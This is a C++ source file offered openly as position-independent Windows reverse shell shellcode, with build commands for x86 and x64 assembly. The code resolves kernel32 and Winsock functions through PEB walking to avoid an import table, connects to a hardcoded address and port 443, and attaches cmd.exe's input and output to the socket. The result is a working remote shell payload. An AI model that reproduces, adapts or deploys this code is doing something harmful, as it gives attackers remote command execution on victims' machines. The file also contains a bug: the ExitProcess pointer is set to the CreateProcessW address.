/*
Author: nozerobit (Coded the reverse shell)
Credits: https://github.com/hasherezade/masm_shc (A helper utility for creating shellcodes. Cleans MASM file generated by MSVC, gives refactoring hints.)
Description: Position-Independent Code (PIC) for Windows x86/x64 Reverse Shell Shellcodes

peb_lookup.h: https://github.com/hasherezade/masm_shc/blob/master/demos/peb_lookup.h

Example:
ml64 windows_reverse_tcp64.asm /link /entry:main /section:.text,ERW
ml windows_reverse_tcp32.asm /link /entry:main /section:.text,ERW
*/

#include <winsock2.h>
#include <Windows.h>
#include "peb_lookup.h"

typedef struct
{
    decltype(&LoadLibraryA) _LoadLibraryA;
    decltype(&GetProcAddress) _GetProcAddress;
    decltype(&CreateProcessW) _CreateProcessW;
    decltype(&ExitProcess) _ExitProcess;
    decltype(&WaitForSingleObject) _WaitForSingleObject;
    decltype(&CloseHandle) _CloseHandle;
} t_mini_iat;

typedef struct
{
    decltype(&WSAStartup) _WSAStartup;
    decltype(&socket) _socket;
    decltype(&inet_addr) _inet_addr;
    decltype(&bind) _bind;
    decltype(&listen) _listen;
    decltype(&accept) _accept;
    decltype(&recv) _recv;
    decltype(&send) _send;
    decltype(&closesocket) _closesocket;
    decltype(&htons) _htons;
    decltype(&WSACleanup) _WSACleanup;
    decltype(&WSAConnect) _WSAConnect;
    decltype(&WSASocketA) _WSASocketA;
} t_socket_iat;


bool init_iat(t_mini_iat& iat)
{
    LPVOID base = get_module_by_name((const LPWSTR)L"kernel32.dll");
    if (!base) {
        return false;
    }

    LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)"LoadLibraryA");
    if (!load_lib) {
        return false;
    }
    LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)"GetProcAddress");
    if (!get_proc) {
        return false;
    }

    LPVOID create_proc = get_func_by_name((HMODULE)base, (LPSTR)"CreateProcessW");
    if (!create_proc) {
        return false;
    }

    LPVOID exit_proc = get_func_by_name((HMODULE)base, (LPSTR)"ExitProcess");
    if (!exit_proc) {
        return false;
    }

    LPVOID wait_proc = get_func_by_name((HMODULE)base, (LPSTR)"WaitForSingleObject");
    if (!wait_proc) {
        return false;
    }

    LPVOID close_han = get_func_by_name((HMODULE)base, (LPSTR)"CloseHandle");
    if (!close_han) {
        return false;
    }

    iat._LoadLibraryA = reinterpret_cast<decltype(&LoadLibraryA)>(load_lib);
    iat._GetProcAddress = reinterpret_cast<decltype(&GetProcAddress)>(get_proc);
    iat._CreateProcessW = reinterpret_cast<decltype(&CreateProcessW)>(create_proc);
    iat._ExitProcess = reinterpret_cast<decltype(&ExitProcess)>(create_proc);
    iat._WaitForSingleObject = reinterpret_cast<decltype(&WaitForSingleObject)>(wait_proc);
    iat._CloseHandle = reinterpret_cast<decltype(&CloseHandle)>(close_han);
    return true;
}

bool init_socket_iat(t_mini_iat& iat, t_socket_iat& sIAT)
{
    LPVOID WS232_dll = iat._LoadLibraryA("WS2_32.dll");

    sIAT._WSAStartup = reinterpret_cast<decltype(&WSAStartup)>(iat._GetProcAddress((HMODULE)WS232_dll, "WSAStartup"));
    sIAT._socket = reinterpret_cast<decltype(&socket)>(iat._GetProcAddress((HMODULE)WS232_dll, "socket"));
    sIAT._inet_addr = reinterpret_cast<decltype(&inet_addr)>(iat._GetProcAddress((HMODULE)WS232_dll, "inet_addr"));
    sIAT._bind = reinterpret_cast<decltype(&bind)>(iat._GetProcAddress((HMODULE)WS232_dll, "bind"));
    sIAT._listen = reinterpret_cast<decltype(&listen)>(iat._GetProcAddress((HMODULE)WS232_dll, "listen"));
    sIAT._accept = reinterpret_cast<decltype(&accept)>(iat._GetProcAddress((HMODULE)WS232_dll, "accept"));
    sIAT._recv = reinterpret_cast<decltype(&recv)>(iat._GetProcAddress((HMODULE)WS232_dll, "recv"));
    sIAT._send = reinterpret_cast<decltype(&send)>(iat._GetProcAddress((HMODULE)WS232_dll, "send"));
    sIAT._closesocket = reinterpret_cast<decltype(&closesocket)>(iat._GetProcAddress((HMODULE)WS232_dll, "closesocket"));
    sIAT._htons = reinterpret_cast<decltype(&htons)>(iat._GetProcAddress((HMODULE)WS232_dll, "htons"));
    sIAT._WSACleanup = reinterpret_cast<decltype(&WSACleanup)>(iat._GetProcAddress((HMODULE)WS232_dll, "WSACleanup"));
    sIAT._WSAConnect = reinterpret_cast<decltype(&WSAConnect)>(iat._GetProcAddress((HMODULE)WS232_dll, "WSAConnect"));
    sIAT._WSASocketA = reinterpret_cast<decltype(&WSASocketA)>(iat._GetProcAddress((HMODULE)WS232_dll, "WSASocketA"));
    return true;
}

int main()
{
    t_mini_iat iat;
    if (!init_iat(iat)) {
        return 1;
    }

    STARTUPINFOW sui;
    PROCESS_INFORMATION pi;

    t_socket_iat sIAT;
    if (!init_socket_iat(iat, sIAT)) {
        return false;
    }

    LPVOID u32_dll = iat._LoadLibraryA("user32.dll");

    // Socket
    WSADATA wsaData;
    SecureZeroMemory(&wsaData, sizeof(wsaData));
    sIAT._WSAStartup(MAKEWORD(2, 2), &wsaData);
    struct sockaddr_in sock_config;
    SecureZeroMemory(&sock_config, sizeof(sock_config));
    //SOCKET listen_socket = sIAT._socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // Change socket to WSASocketA
    SOCKET listen_socket = sIAT._WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    sock_config.sin_addr.s_addr = sIAT._inet_addr("127.0.0.1");
    sock_config.sin_family = AF_INET;
    sock_config.sin_port = sIAT._htons(443);

    // Connect
    sIAT._WSAConnect(listen_socket, (SOCKADDR*)&sock_config, sizeof(sock_config), NULL, NULL, NULL, NULL);

    // Process
    SecureZeroMemory(&sui, sizeof(sui));
    sui.cb = sizeof(sui);
    SecureZeroMemory(&pi, sizeof(pi));
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) listen_socket;

    // Start the child process. 
    if( !iat._CreateProcessW( L"C:\\Windows\\System32\\cmd.exe",   // No module name (use command line)
        L"/c cmd.exe",        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        TRUE,          // Set handle inheritance to TRUE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &sui,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        return 1;
    }
    // Wait until child process exits.
    iat._WaitForSingleObject( pi.hProcess, INFINITE );
    // Close process and thread handles. 
    iat._CloseHandle( pi.hProcess );
    iat._CloseHandle( pi.hThread );
    //iat._ExitProcess(0);
    //return 0;
}